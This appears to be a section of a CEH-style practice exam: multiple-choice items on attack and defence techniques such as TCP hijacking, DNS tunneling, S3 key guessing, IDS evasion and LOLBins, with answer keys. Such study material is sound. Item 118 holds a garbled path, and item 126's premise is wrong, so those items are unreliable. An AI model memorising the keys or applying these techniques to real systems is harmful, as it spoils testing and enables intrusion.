+103. A SOC investigates a suspected Mirai-variant outbreak. Which observation MOST strongly supports attribution to an IoT botnet like Mirai rather than a Windows-based spam botnet?
+A. Outbound TCP connections to 25/tcp and 587/tcp with SMTP AUTH attempts
+B. Large volumes of TCP SYN and UDP floods from embedded devices using default credentials, plus scanning on 23/tcp and 2323/tcp
+C. DNS TXT lookups carrying high-entropy payloads at a steady 500 bps
+D. Beaconing to a Tor hidden service over 9050/tcp using SOCKS5
+Correct Answer: B Explanation: Mirai-class IoT botnets propagate by brute-forcing or abusing default creds (telnet/SSH) on embedded/SoHo devices and then launch commodity floods (TCP SYN, ACK, UDP, GRE). Scanning for telnet ports 23/2323 and behavior localized to IoT hardware fits this profile. Option A matches spam botnets using SMTP relaying. Option C suggests DNS tunneling/malware C2 but not Mirai’s telnet-centric propagation. Option D indicates Tor-based C2, more typical of desktop malware than lightweight IoT binaries.
+
+104. A penetration tester aims to seize a client–server TCP session by forcing one endpoint out of sync and then injecting payloads that the other endpoint will accept. Which action MOST directly enables this desynchronization?
+A. Launch a SYN flood against the server to exhaust backlog queues
+B. Send ICMP Echo storms to the client to increase latency and create jitter
+C. Perform DHCP starvation to force lease expiration on the client
+D. Transmit spoofed in-window RST/FIN segments to one side, then inject data toward the other side
+Correct Answer: D Explanation: Active hijacking commonly leverages spoofed in-window RST or FIN packets to one endpoint to desynchronize the session state (e.g., one side believes the flow is closed/half-closed), then injects data toward the other endpoint with correctly tracked sequence/ACK numbers; classic tooling includes tcpkill (dsniff), Hunt, Juggernaut, and modern Scapy-based scripts. A is a denial-of-service tactic that impacts new handshakes rather than taking over an existing stream. B may degrade quality but does not directly cause a controlled sequence/ACK state divergence. C concerns addressing/leases and is unrelated to the TCP state manipulation needed for session hijacking.
+
+105. You mirror a critical switch port to an analysis host running Wireshark. Which display filter will BEST isolate TCP payloads likely to contain cleartext credentials transmitted via HTTP Basic Authentication?
+A. tcp.flags.syn == 1 and tcp.flags.ack == 0
+B. arp or dns
+C. http.authorization and tcp.len > 0
+D. tls.handshake
+Correct Answer: C Explanation: http.authorization and tcp.len > 0 (C) is the most appropriate Wireshark display filter to surface HTTP Authorization headers, including Basic (base64 of username:password). SYN-only filters (A) capture handshake starts without application data. ARP/DNS (B) are control/lookup protocols and won’t include HTTP credentials. TLS handshake (D) indicates encrypted sessions; HTTP Basic headers wouldn’t be visible unless you have decryption keys and SSL key log configured.
+
+106. Your target’s egress policy allows only DNS and proxied HTTPS. During a controlled test, you must establish a C2/data channel that blends into allowed traffic without direct TCP/SSH egress. Which tool MOST directly provides a DNS-based tunneling channel suitable for this scenario?
+A. stunnel
+B. dnscat2
+C. socat
+D. curl
+Correct Answer: B Explanation: dnscat2 implements a bidirectional tunnel over DNS (often using TXT or other record types), enabling command/data exchange through firewalls that allow DNS while remaining within CEH-appropriate testing bounds; defenders counter with DNS analytics (entropy, volume, label length), RPZ, and egress restrictions. A (stunnel) wraps TCP in TLS but still needs an egress path to the chosen port and is not DNS-native. C (socat) is a versatile relay but provides no inherent evasion over DNS. D (curl) is an HTTP client and cannot itself create a DNS tunnel.
+
+107. A threat actor abuses a container to fork bomb processes and allocate memory, attempting to starve the node. Which Linux feature is designed to enforce per-container resource limits (CPU, memory, I/O) and help prevent this condition?
+A. Linux namespaces (PID, NET, MNT)
+B. seccomp-bpf syscall filtering
+C. cgroups (control groups)
+D. Linux capabilities (e.g., CAP_SYS_ADMIN)
+Correct Answer: C Explanation: cgroups are the kernel mechanism that enforces accounting and limits for CPU, memory, and I/O so a single container cannot monopolize node resources if limits/requests are set correctly by the orchestrator; CEH-focused hardening includes setting requests/limits in Kubernetes and enabling eviction policies. A is incorrect because namespaces isolate views (process IDs, network stacks, mounts) rather than enforce consumption ceilings. B is incorrect since seccomp restricts syscalls (e.g., blocking ptrace, clone3) but does not govern resource quotas. D is incorrect because capabilities govern privilege granularity (e.g., filesystem admin, raw sockets) and do not provide resource throttling. Tools like Falco can alert on fork bombs, but prevention depends on cgroups plus scheduler limits.
+
+108. You find an S3 bucket where s3:ListBucket is denied to everyone, but object ACLs/policy allow anonymous s3:GetObject for keys under public/. You don’t know the object names. What tactic MOST reliably discovers accessible content with minimal noise?
+A. Attempt S3 website directory listing at the bucket’s website endpoint
+B. Run aws s3 ls s3://bucket --no-sign-request to enumerate keys directly
+C. Perform targeted key brute-forcing using HEAD/GET for predictable prefixes (e.g., public/2025/09/, common filenames) and analyze status code differences
+D. Enable S3 Inventory on the bucket and download the CSV manifest
+Correct Answer: C Explanation: When ListBucket is denied but object reads under a prefix are allowed, directory-style listing won’t work; targeted key guessing (e.g., timestamped or semantic filenames) with HEAD/GET against public/ lets you enumerate discoverable objects by interpreting 200/403/404 responses (a common attacker technique). A is incorrect since S3 website hosting does not provide directory indexes by default and still depends on ListBucket. B will fail because ListBucket is explicitly denied. D is a defender-side feature the attacker cannot enable. Defenses: enforce deny on GetObject for anonymous principals, block public access at the account/bucket level, and monitor unusual GetObject patterns.
+
+109. You are planning a campaign to minimize attribution and reduce detection during external recon. Which approach best reflects daisy chaining for anonymity in CEH practice?
+A. Using a single reputable VPN provider before connecting to target assets
+B. Routing traffic through multiple chained proxies/VPNs/Tor nodes so each hop obscures the prior hop’s origin
+C. Launching scans from a cloud VM in the same region as the target to reduce latency and evade IDS
+D. Using packet fragmentation in Nmap to bypass stateless ACLs
+Correct Answer: B Explanation: In CEH, daisy chaining = multi-hop anonymity (e.g., VPN → Tor → VPS proxy → C2 redirector) to complicate attribution and traffic analysis. A lacks chaining. C may lower suspicion but doesn’t provide layered anonymity. D pertains to packet-level IDS/ACL evasion, not anonymity chaining.
+
+110. An enterprise wants to reduce the risk of offline password cracking of WPA2-PSK networks while still supporting legacy devices temporarily. Which defense is the most appropriate immediate control?
+A. Migrate to WPA2/WPA3 Enterprise (802.1X) or enable WPA3-SAE, and avoid mixed PSK transition SSIDs where possible
+B. Use longer (64+ character) SSIDs so capture tools cannot index the network easily
+C. Rely on MAC filtering plus complex PSK values to prevent attackers from obtaining handshakes
+D. Only increase the AP channel width to reduce time for brute-force attacks
+Correct Answer: A Explanation: Correct Answer: A — The most robust mitigation is to eliminate PSK-based shared passphrases where feasible by migrating to WPA2/WPA3-Enterprise (802.1X with EAP-TLS) or to WPA3-SAE for personal networks; these remove the offline dictionary attack surface inherent in PSK 4-way handshakes (and SAE resists classic offline cracking). Avoiding mixed “transition” SSIDs that offer both SAE and PSK prevents downgrade or fallback that attackers can exploit. B is incorrect because SSID length/complexity does not meaningfully impede capture tools or offline cracking; the SSID is required for PBKDF2 and is often known from beacons. C is incorrect because MAC filtering is easily bypassed and does not prevent handshake capture; extremely long PSKs help but still allow offline attacks if handshake material is captured. D is incorrect because channel width affects throughput, not the feasibility of offline brute-force; it does not reduce attackers’ ability to perform offline cracking once they have a captured handshake.
+
+111. Your client asks for evidence that sensitive personal data is at risk due to oversharing on social platforms, but your scope allows only passive collection and bans data exfiltration. What deliverable BEST satisfies the request?
+A. A curated, timestamped dossier of public posts, profile fields, and images that reveal PII (e.g., corporate ID badges in selfies, meeting links, location tags), with redactions in the report and remediation guidance
+B. Screenshots of private Facebook posts obtained by sending friend requests that were accepted during the test
+C. A CSV of scraped emails and phone numbers from a third-party “lead gen” broker that claims to source data from the target’s employees
+D. Copies of exposed HR PDFs downloaded from links shared in a private employee group you joined covertly
+Correct Answer: A Explanation: A is the correct, ethical choice—compile only publicly visible items, record provenance and timestamps, redact sensitive elements in deliverables, and include specific remediation steps (tighten privacy settings, remove location tags, limit badge photos, rotate meeting links) in line with CEH reporting practices and RoE. B relies on befriending targets (social engineering) and violates “no outreach.” C introduces unverifiable, possibly illicit data sourcing and legal risk. D involves covert group infiltration and downloading internal files—both are out of scope and unethical for passive footprinting.
+
+112. A junior analyst suggests “double DES” (encrypt with DES under key K1, then again under key K2) as a cheap alternative to 3DES. Which cryptanalysis MOST effectively breaks double DES far below 2^112 work?
+A. Differential-linear hybrid attack
+B. Integral attack on middle rounds
+C. Biclique attack similar to AES key-recovery
+D. Meet-in-the-middle using one known plaintext/ciphertext pair (~2^57 time & memory)
+Correct Answer: D Explanation: Meet-in-the-middle (MitM) attacks on double encryption compute E_K1(P) for all K1 and D_K2(C) for all K2, then match midpoints to recover candidates, reducing complexity from ~2^112 to roughly 2^57 operations and significant memory, so D is correct. A and B are specialized cryptanalytic hybrids not known to collapse 2DES as effectively as MitM. C (biclique) applies to AES and reduces key search marginally; it’s not the classic break of 2DES.
+
+113. Incident response finds a worm spreading internally via SMB. As a containment measure, which immediate action BEST reduces propagation?
+A. Block inbound and outbound SMB traffic across workstations with host-based firewalls
+B. Rotate all user and service account passwords immediately
+C. Disable TLS encryption on the internal proxy to inspect plaintext traffic
+D. Wipe and rebuild every host without further analysis
+Correct Answer: A Explanation: A is correct because blocking SMB halts worm lateral movement (ATT&CK T1021.002). B (password rotation) helps against credential theft but doesn’t stop worm exploitation. C (TLS disabling) won’t affect SMB propagation. D (wipe all hosts) is extreme, disrupts business, and wastes forensic opportunities. CEH emphasizes fast, targeted containment: block exploited protocols and segment networks.
+
+114. While monitoring DNS telemetry, an analyst notices periodic bursts of queries to many different second-level domains with high-entropy labels (e.g., pwz7x…, g1k4q…) spread across multiple TLDs, with very low resolution success rates and varying NXDOMAIN responses. Which malware C2 technique does this pattern MOST likely indicate?
+A. Fast-flux hosting using rapidly changing A records behind a single domain
+B. Domain Generation Algorithm (DGA) producing pseudo-random domains per time-seed
+C. DNS tunneling over TXT records for data exfiltration and C2 commands
+D. Hard-coded IP beacons with TLS client certificate pinning
+Correct Answer: B Explanation: The hallmark of DGA (B) is numerous high-entropy, pseudo-random domain lookups across TLDs with mostly NXDOMAIN results until the operator registers a subset; CEH covers this as a resilient C2 mechanism. Fast-flux (A) revolves around one or few domains with rapidly changing IPs (low TTL). DNS tunneling (C) would feature large TXT queries/answers or long subdomain labels carrying data rather than broad random domain churn. Hard-coded IP beacons (D) show stable destinations, not randomized domain lookups. Detection involves linguistic/entropy models, frequency analysis, and sinkholing; prevention includes egress DNS controls and threat-intel DGA seed lists.
+
+115. During a permitted, credentials-provided check of an on-prem core switch via SNMP, which object group is MOST useful for mapping Layer-3 interfaces and their IPs to support network footprinting?
+A. IF-MIB::ifTable (1.3.6.1.2.1.2.2) in combination with IP-MIB (ipAddrTable/ipAddressIfIndex)
+B. HOST-RESOURCES-MIB::hrSWRun to list running processes
+C. TCP-MIB::tcpConnTable for enumerating live TCP sessions
+D. UCD-SNMP-MIB::laLoad for processor load statistics
+Correct Answer: A Explanation: A is correct: IF-MIB provides interface indices, names, speeds, and statuses; correlating with IP-MIB (legacy ipAddrTable or ipAddressTable in IP-MIB) maps those interfaces to L3 addresses—core for building an accurate topology during sanctioned checks. B is host-centric, not interface mapping. C shows transient flows, not stable interface/IP inventory. D is health telemetry and irrelevant for footprinting.
+
+116. A defender wants to reduce user impact while neutralizing DHCP starvation attempts launched from infected endpoints on access ports. Which switch configuration is the BEST single change to throttle the attack and preserve normal client access?
+A. Increase the DHCP lease time so clients renew less frequently
+B. Trust all access ports to reduce control-plane load on the switch
+C. Disable DHCP relay and force all segments to run local servers
+D. Enable DHCP snooping and set a per-port DHCP packet rate-limit on untrusted interfaces (e.g., ip dhcp snooping limit rate 10)
+Correct Answer: D Explanation: Enabling DHCP snooping with a per-port rate limit on untrusted interfaces throttles the volume of DHCPDISCOVER/REQUEST messages a single attacker can send, preventing scope exhaustion while allowing legitimate clients to function (D). Longer leases (A) do not stop an attacker from generating thousands of fake clients. Trusting access ports (B) defeats the protection and allows rogue servers. Removing relays and proliferating servers (C) adds operational complexity and does not inherently mitigate starvation. Rate-limiting under snooping complements Port Security (MAC limits) and helps contain attack traffic without widespread disruption.
+
+117. Your organization wants to detect and respond to external footprinting activities (OSINT aggregation, passive DNS lookups, certificate issuance) as early warning signals. Which monitoring strategy is MOST appropriate and actionable?
+A. Subscribe to Certificate Transparency monitoring for your domains, ingest passive DNS feeds, consume third-party OSINT alerts (e.g., Shodan/Censys, domain registration watches), and integrate these sources into your SIEM/incident workflow with triage rules and SLA-driven responses
+B. Configure your firewall to block all traffic from IPs that performed any DNS lookup for your domains
+C. Rely on manual weekly Google searches for your company name and subdomains
+D. Disable all public-facing services to avoid being monitored at all
+Correct Answer: A Explanation: A is correct: an active external monitoring program—CT log alerts, passive DNS, third-party scanner notifications, and domain/WHOIS watches—feeds into SIEM and incident-response processes, enabling actionable detection and remediation (e.g., takedowns, certificate revocation, content removal). B is infeasible and counterproductive (DNS lookups originate from distributed resolvers and blocking them is meaningless). C (manual weekly searches) is insufficiently timely and error-prone. D (disabling public services) is unrealistic for most businesses and not a viable defense.
+
+118. An API gateway blocks /admin/* paths via a simple prefix check. You successfully access /admin//export and /adm陌N/overview (note the Unicode dot-dot and a Turkish capital I) to reach protected content. Which technique MOST precisely describes this authorization bypass?
+A. Basic brute forcing of hidden routes using a large wordlist
+B. Path normalization and Unicode/encoding ambiguities to defeat naive path-based ACLs
+C. Reflected XSS payloads that execute in the admin console
+D. Clickjacking against the admin interface to trick a user into navigation
+Correct Answer: B Explanation: This is a path canonicalization/normalization failure: double-encoding, dot-segment tricks, and Unicode homoglyphs can cause the gateway and the upstream service to interpret the path differently, bypassing prefix filters (B). Wordlists (A) don’t explain evading a block with encoded/Unicode variants. XSS (C) is orthogonal to access control decisions. Clickjacking (D) abuses UI framing, not server-side path checks. Robust defenses canonicalize/normalize before policy checks, use allowlists mapped to resolved routes, and test with double-encoding/Unicode variants.
+
+119. You are hardening credential storage after a breach exposed a database of unsalted SHA-1 password hashes. Which change MOST effectively counters offline cracking and rainbow tables going forward?
+A. Enforce 12-character minimums and complexity rules only
+B. Encrypt the hash table with AES-256-GCM at rest and keep using SHA-1 for hashing
+C. Salt with a single global “pepper” value and keep a fast hash for performance
+D. Store passwords using Argon2id/bcrypt/scrypt or PBKDF2-HMAC-SHA-256 with a unique per-user salt and tuned cost (iterations/memory); optionally add an application-level pepper in an HSM
+Correct Answer: D Explanation: Rainbow tables exploit unsalted, fast hashes. The proper countermeasure is a unique per-user salt plus a slow (preferably memory-hard) KDF such as Argon2id/bcrypt/scrypt (or PBKDF2 with high iterations), optionally adding a pepper stored separately (e.g., HSM), so D is correct. A improves entropy but does not defeat fast offline cracking. B protects data at rest only; once read, fast SHA-1 remains weak. C a single “pepper” alone does not replace per-user salts or slow KDFs.
+
+120. A Java-based e-commerce site stores a Base64-encoded session cookie that, when decoded, contains a serialized object. Modifying the payload to a known gadget chain results in remote code execution on a vulnerable library version. What web application threat BEST explains this issue?
+A. XML external entity (XXE) processing in the login response
+B. SQL injection via unsafe deserialization of string fields
+C. Insecure deserialization leading to arbitrary code execution
+D. Server-side template injection (SSTI) via EL expressions in JSP
+Correct Answer: C Explanation: Insecure deserialization occurs when untrusted serialized data is accepted and deserialized, allowing attackers to supply gadget chains that trigger dangerous behavior up to RCE; the Base64 cookie containing a serialized object is a hallmark. XXE (A) involves XML parser misconfiguration and external entities, not object streams. SQL injection (B) is about injecting SQL into database queries; while deserialized data may later reach a DB, the described RCE via gadget chains is characteristic of insecure deserialization. SSTI (D) affects template engines (e.g., Freemarker, Thymeleaf, Velocity), whereas the scenario centers on Java object deserialization. Mitigations include avoiding native deserialization for untrusted data, using signed/crypto-MAC’d tokens with strict verification, employing allowlisted transformers, and upgrading libraries to remove known gadget chains.
+
+121. During red-team testing you discover that internal hosts are exfiltrating via DNS tunneling. Which set of countermeasures MOST effectively detects and disrupts DNS-based covert channels?
+A. Apply DNS egress filtering (force use of enterprise resolvers), limit permitted query types, enforce length/label limits, apply entropy and volume detection, and use RPZ/secure DNS policies.
+B. Block ICMP and UDP everywhere.
+C. Disable DNS entirely on all hosts and rely only on hard-coded IPs.
+D. Only use static threat feeds for known malicious domains and ignore behavior.
+Correct Answer: A Explanation: A is correct because DNS tunneling is best mitigated by layered DNS controls: force internal clients to use controlled resolvers, block external recursive resolvers, limit allowed record types (e.g., TXT), monitor query volume, label length and entropy (base32/base64 indicators), and apply RPZ/Threat Intel to block known malicious zones. B is overbroad and disruptive (DNS uses UDP). C is untenable operationally. D is insufficient because tunneling uses new/legitimate-looking domains and behavior-based detection is required.
+
+122. Which open-source tool is purpose-built to automate detection, fingerprinting, exploitation and (when authorized) data extraction for SQL injection across many DBMSs, and includes features such as multiple technique selection (--technique), tamper scripts, DBMS fingerprinting (--dbms), and OOB (DNS/HTTP) callbacks?
+A. sqlmap
+B. Burp Repeater
+C. Wireshark
+D. Nikto
+Correct Answer: A Explanation: sqlmap is the specialist automation tool for SQL injection: it enumerates injection points, fingerprints DBMS types/versions, supports techniques (boolean, time, error, UNION, stacked), allows tamper scripts to modify payloads, and supports OOB channels (DNS/HTTP) for exfiltration. Burp Repeater (B) is a manual request replay/modify tool useful for controlled probes but not a full automation/exploitation framework. Wireshark (C) is a packet capture tool and does not perform SQLi testing; it may be useful for observing network activity but not for injection payload crafting. Nikto (D) is a web server/vulnerability scanner focused on misconfigurations and common vulnerabilities, not a dedicated SQLi exploitation framework. In CEHv13 methodology, use sqlmap for automated enumeration only after manual confirmation and within scope.
+
+123. A user opens an emailed Excel file that contains “Enable Content” prompts. Security logs show excel.exe spawning cmd.exe which launches powershell.exe to download and execute a Trojan from a cloud bucket. You want to stop this class of infection without disabling macros organization-wide. Which single control is MOST targeted to this technique?
+A. Require PowerShell Constrained Language Mode and script signing only
+B. Attack Surface Reduction (ASR) rule: “Block all Office applications from creating child processes”
+C. Block TCP/443 egress for all endpoints except the security team
+D. Disable SMBv1 and NetBIOS over TCP/IP on workstations
+Correct Answer: B Explanation: The ASR rule blocking Office child processes (B) directly prevents the macro-to-cmd/powershell process chain that Trojans leverage (ATT&CK: T1204, T1059). Constrained Language Mode/signing (A) is valuable but can be bypassed (e.g., unmanaged interpreters, living-off-the-land binaries) and does not stop Office from spawning them. Blanket 443 egress blocks (C) are operationally impractical and overbroad while still leaving other paths (e.g., proxies) unless finely tuned. Disabling SMBv1/NetBIOS (D) hardens lateral movement, not initial macro spawning. CEH recommends ASR/AppLocker/WDAC plus mail and content filtering for Trojan macro pathways.
+
+124. Which search-engine operator combination is MOST useful for discovering sensitive configuration files (e.g., .env, .git/config) that have been accidentally exposed on web servers?
+A. site:target.com inurl:.git
+B. site:target.com intitle:"login"
+C. site:target.com filetype:log
+D. site:target.com intext:"API_KEY="
+Correct Answer: A Explanation: site:target.com inurl:.git targets URLs containing .git, often exposing .git directories that may be publicly accessible and allow download of repository objects and configuration files (including .git/config), a commonly exploited misconfiguration. This dork is widely used in reconnaissance to identify inadvertently exposed repositories. Option B (intitle:"login") identifies login pages but not exposed config files. Option C (filetype:log) can find logs but many servers don't index raw logs and it’s less precise. Option D (intext:"API_KEY=") could find pages where keys are printed, but it relies on the site exposing key strings verbatim and may return fewer actionable hits than .git exposure.
+
+125. Which of the following attacker capabilities made the Kaminsky-style DNS cache poisoning attacks (2008) significantly easier and more reliable against many resolvers at the time?
+A. Use of DNSSEC validation failures on authoritative servers
+B. Predictability (or low entropy) of source UDP port and DNS transaction ID on many resolvers
+C. The prevalence of IPv6-only resolvers without fallback
+D. Weak TLS certificate validation on authoritative nameservers
+Correct Answer: B Explanation: The Kaminsky vulnerability relied on predictable DNS transaction IDs and predictable UDP source ports (low entropy) in many caching resolvers, making it feasible for attackers to race legitimate responses and inject forged answers into resolver caches (B). DNSSEC validation failures (A) are unrelated to Kaminsky’s technique. IPv6-only resolvers (C) are irrelevant to the fundamental predictor problem. Weak TLS certificate validation (D) pertains to TLS and HTTPS, not to DNS UDP transaction ID / port entropy issues exploited in that era.
+
+126. While performing a network engagement you craft packets with a forged source IP equal to the gateway’s IP so that target hosts send replies to you. This technique—commonly used to intercept traffic indirectly or to facilitate reflection/amplification attacks—is known as:
+A. IP spoofing
+B. MAC spoofing
+C. DNS spoofing
+D. Email spoofing
+Correct Answer: A Explanation: IP spoofing (A) is the deliberate falsification of the IP source address field in an IP packet so that the packet appears to originate from another host (e.g., the gateway). This can be used to induce replies to be sent to the spoofed address (useful in reflection/amplification attacks) or, when combined with other techniques, to facilitate interception. MAC spoofing (B) alters the link-layer source (useful for port stealing/ARP tricks) but does not change the IP header. DNS spoofing (C) is about fabricating DNS responses to redirect names to attacker-controlled addresses, not forging IP headers. Email spoofing (D) forges SMTP headers (From:) to impersonate senders; it’s an application-layer spoof, not the network-layer technique described. In CEHv13 terms IP spoofing is an L3 technique that can support sniffing by enabling traffic redirection or by evading source-based filtering.
+
+127. You query RDAP for example.com and see: "entities":[{"roles":["registrar"]},{"roles":["registrant"],"vcardArray":[... "fn":"Domains By Proxy" ...]}] and "status":["clientTransferProhibited"]. What is the MOST accurate interpretation for footprinting?
+A. The domain is unlocked for transfer and the real registrant’s full PII is available in RDAP
+B. The registrant is the same as the registrar and transfer is unrestricted
+C. The domain uses DNSSEC validation and transfer must occur via EPP auth-info only
+D. The domain is privacy-shielded (proxy service listed as registrant), and the registrar has set a client-side transfer lock that would need deliberate removal to transfer
+Correct Answer: D Explanation: “Domains By Proxy” (or similar) indicates a privacy/proxy service masking the actual registrant; "clientTransferProhibited" reflects an EPP status preventing transfer until unlocked—key signals for ownership and contact escalation paths. A is wrong: the status shows locked and registrant PII is masked. B misreads roles; registrar and registrant are distinct entities. C mentions DNSSEC and EPP specifics not evidenced; RDAP status does not imply DNSSEC, and transfer locks are independent of DNSSEC presence.
+
+128. An attacker on a routed internal segment injects crafted TCP packets with predicted sequence and acknowledgment numbers, sending RST/ACK frames to desynchronize a client–server flow and then inserting spoofed data to assume the client’s identity. What category of session hijacking is this?
+A. Passive network hijacking
+B. Session fixation
+C. Man-in-the-browser (MitB)
+D. Active TCP session hijacking
+Correct Answer: D Explanation: The scenario describes active TCP session hijacking because the attacker manipulates an existing TCP connection by desynchronizing endpoints and injecting spoofed packets with guessed sequence/ACK numbers; classic techniques include blind/non-blind hijacking, RST/FIN desync, and keystroke injection, historically demonstrated with tools like Hunt/Juggernaut and modern packet crafting (Scapy). A is incorrect because passive hijacking limits itself to sniffing/monitoring traffic without modifying it. B is incorrect as fixation pertains to web application session IDs and authentication flows, not transport-layer sequence manipulation. C is incorrect because MitB uses malware to hook the browser/DOM and alter transactions locally, not to inject raw TCP segments on the network.
+
+129. Your blue team suspects low-and-slow C2 using jittered beacons, domain fronting/CDN cover traffic, and rotating TLS client fingerprints. Known IOCs are ineffective. Which IDS detection approach provides the BEST chance of discovery?
+A. Strict signature matching on known C2 URIs and JA3 hashes from past campaigns
+B. Detonating downloaded binaries in a sandbox to look for process injections
+C. Network behavior anomaly detection with baselining (e.g., periodicity drift, DNS request entropy, TLS JA3/JA4 outliers, rare SNI)
+D. Port-based allowlists that restrict traffic to TCP/443 and TCP/80 only
+Correct Answer: C Explanation: Behavior/anomaly analytics identify statistical deviations (beacon periodicity with jitter, rare destinations, DNS entropy changes, TLS fingerprint anomalies) even when adversaries evade static IOCs via fronting and rotation; tools like Zeek plus ML/UEBA can baseline norms and surface outliers. A fails when indicators are intentionally varied. B is valuable for file-based threats but misses pure network beacons that never drop binaries. D is ineffective because modern C2 hides in allowed ports (80/443); port controls alone cannot detect covert channels within legitimate services.
+
+130. During testing, you find that a PHP application connects to MySQL using the account webapp_user with GRANT ALL PRIVILEGES ON *.* permissions. Which is the MOST critical risk of this misconfiguration?
+A. Attackers could exploit CSRF tokens to escalate their session privileges
+B. Exploitation of SQL injection would allow full database control, including schema modification and user management
+C. Cross-site scripting could leak sensitive cookies to the attacker
+D. Denial-of-service due to excessive use of LIMIT queries
+Correct Answer: B Explanation: Assigning ALL PRIVILEGES to a web application account means that any SQL injection allows total compromise: creating/dropping tables, escalating privileges, creating users, and full data exfiltration (B). CSRF (A) is unrelated to DB permissions. XSS (C) is a separate client-side risk. Excessive use of LIMIT (D) may cause performance issues but is not the critical issue of misconfiguration here. Best practice is least privilege: grant only SELECT, INSERT, UPDATE, DELETE on specific schemas.
+
+131. A staffer receives a LinkedIn connection request from the “CFO” with a profile URL of linkedin.com/in/michaeI-johnson that looks correct at a glance; the account has a professionally written bio, the CFO’s stolen headshot, and dozens of mutual connections the staffer doesn’t actually know personally. Which indicator MOST strongly signals an impersonation using a look-alike account?
+A. The account has under 200 connections and limited posting history
+B. The profile URL/handle uses homoglyphs (e.g., uppercase “I” instead of lowercase “l”) to mimic the real name
+C. The account posts frequently about corporate achievements and charity events
+D. The account lists a prior employer that the real CFO once worked at
+Correct Answer: B Explanation: Homoglyph abuse (B)—such as substituting Latin “l” with uppercase “I” or Cyrillic characters—creates deceptive, look-alike handles and is a high-fidelity signal of impersonation on social platforms; this is a classic account-establishment technique (MITRE ATT&CK: T1585.001 Social Media Accounts) used in executive-impersonation schemes. A small network or young account (A) can be legitimate for some users and is a weak signal by itself. Posting about company initiatives (C) is easily cloned from public PR and does not prove illegitimacy. A prior employer match (D) can be scraped from the real executive’s public résumé; alone it does not confirm a fake.
+
+132. During a web exploitation test, the attacker uses overlapping IP fragments and contradictory TCP segment sequence numbers so that the target OS reconstructs a payload that the NIDS never sees. The pcap on the sensor shows all packets, but no alert triggers and the server is compromised. Which evasion technique is MOST likely in use?
+A. Polymorphic shellcode to evade byte-pattern signatures
+B. Target-based reassembly mismatch (fragment/stream overlap) to desynchronize IDS and host
+C. Alert flooding to bury true positives in noise
+D. TCP ACK scan to hide open ports in plain sight
+Correct Answer: B Explanation: B is correct because overlapping fragments and conflicting TCP sequences exploit differences between an IDS’s normalizer/reassembler and the endpoint TCP/IP stack, causing the IDS to assemble a benign stream while the host reconstructs the malicious bytes; this is classic insertion/evasion per Ptacek–Newsham. A focuses on payload mutation and would not explain the contradictory sequencing/reassembly behavior. C (alert flooding) increases volume but does not account for a missed alert on an observed exploit stream. D (ACK scanning) is a stealth reconnaissance technique and unrelated to differential reassembly of exploit payloads.
+
+133. During a quick TLS check on a newly deployed API endpoint, you want to open a live handshake to print the full certificate chain, negotiated protocol/cipher, and ALPN while correctly sending SNI. Which command is the MOST appropriate?
+A. nmap --script ssl-enum-ciphers -p 443 api.example.com
+B. openssl s_client -connect api.example.com:443 -servername api.example.com -alpn h2,http/1.1 -showcerts
+C. openssl x509 -in server.crt -text -noout
+D. keytool -list -keystore server.jks
+Correct Answer: B Explanation: openssl s_client performs a real TLS handshake and prints the negotiated protocol/cipher, ALPN, OCSP stapling, and the exact server-sent chain (with -showcerts), and -servername ensures SNI is used, making B correct. A runs an NSE script that enumerates ciphers without necessarily showing the actual chain from a single live connection; it is excellent for breadth but not for the specific “show this handshake’s chain” requirement. C only decodes a local certificate file and provides no handshake details. D lists entries inside a Java keystore, not a remote server’s live TLS negotiation. In CEHv13 tooling, openssl s_client is the standard, quick on-box probe for certificate/handshake verification.
+
+134. A threat actor gained access to a cloud workload and attempts to enumerate secrets by scanning environment variables, mounted volumes, and metadata endpoints. Which combined preventive configuration MOST reduces this reconnaissance success?
+A. Automount service account tokens disabled by default, restrict hostPath mounts, and use IAM roles with least-privilege (no wildcard permissions)
+B. Increase pod CPU and memory limits so the attacker cannot list environment variables due to throttling
+C. Enable detailed application-level debug logging to trace attacker activity
+D. Allow all service accounts to read metadata for transparency, but enforce encryption-at-rest on secrets
+Correct Answer: A Explanation: Correct Answer: A. Disabling automatic service account token mount (automountServiceAccountToken: false), forbidding or strictly controlling hostPath mounts, and enforcing least-privilege IAM roles reduce the avenues an attacker can use to retrieve credentials (no accessible tokens, no host filesystem access) and limit what an attacker can do if they obtain a token. Option B (increasing resource limits) does not prevent secrets discovery and is irrelevant to reconnaissance. Option C (debug logging) may help detection but can leak sensitive info and is reactive rather than preventive. Option D is counterproductive—allowing all service accounts to read metadata increases exposure; encryption-at-rest without access controls or token protections does not block metadata/token theft.
+
+135. A blue team deploys application whitelisting (AppLocker/WDAC) and an EDR tuned to block unknown binaries. The red team still executes payloads by launching trusted, signed Windows utilities (e.g., script hosts and registration tools) that fetch and run attacker-controlled logic without writing a new EXE. Which technique is being used to evade endpoint controls?
+A. Living-off-the-land via signed binary proxy execution (LOLBins)
+B. Kernel Direct Kernel Object Manipulation (DKOM) rootkit persistence
+C. BIOS/UEFI firmware reflashing for pre-boot persistence
+D. User Account Control (UAC) bypass through consent UI spoofing alone
+Correct Answer: A Explanation: Using signed, native binaries (LOLBins) such as regsvr32, mshta, rundll32, or installutil to proxy malicious content is a well-known defense-evasion method (MITRE ATT&CK T1218) that slips past basic whitelisting and some signature checks because the launcher is trusted; robust policy must explicitly constrain these binaries’ behaviors (e.g., WDAC deny rules, Constrained Language Mode, child-process, and network egress controls). B and C are advanced persistence vectors but do not match the observed reliance on trusted user-mode binaries to execute payloads. D may elevate privileges in some cases but does not inherently explain execution under strict whitelisting without new binaries.
